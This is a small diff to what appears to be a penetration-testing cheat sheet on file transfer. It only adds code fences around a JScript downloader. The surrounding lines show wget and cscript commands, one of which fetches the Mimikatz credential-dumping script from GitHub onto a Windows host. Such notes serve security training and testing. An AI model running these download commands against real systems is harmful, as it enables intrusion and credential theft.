@@ -173,6 +173,7 @@ wget http://10.10.10.10:80/info.txt -O /tmp/info.txt
 
 > cscript /nologo wget.js https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1
 
+```
 var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
 WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
 WinHttpReq.Send();
@@ -185,6 +186,7 @@ BinStream.Open();
 BinStream.Write(WinHttpReq.ResponseBody);
 BinStream.SaveToFile("out.bin");
 */
+```
 
 Links:
 
